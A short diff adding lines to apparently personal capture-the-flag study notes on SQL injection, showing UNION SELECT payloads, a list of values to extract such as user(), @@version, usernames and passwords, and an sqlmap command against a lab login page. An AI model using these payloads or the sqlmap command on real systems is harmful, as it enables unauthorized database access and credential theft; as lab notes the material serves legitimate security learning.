@@ -30,6 +30,15 @@ Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypa
 - ' UNION SELECT NULL--
 - ' UNION SELECT NULL,NULL--
 - ' UNION SELECT NULL,NULL,NULL--
+- Finally, we can start getting some valuable information. Simply replace some null values with SQL keywords to get information about the database.
+- Here's a small list of thing you'd want to retrieve:
+1. database()
+2. user()
+3. @@version
+4. username
+5. password
+6. table_name
+7. column_name
 # until the error occurs
 sqlmap --url http://tbfc.net/login.php --tables --columns <br/>
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
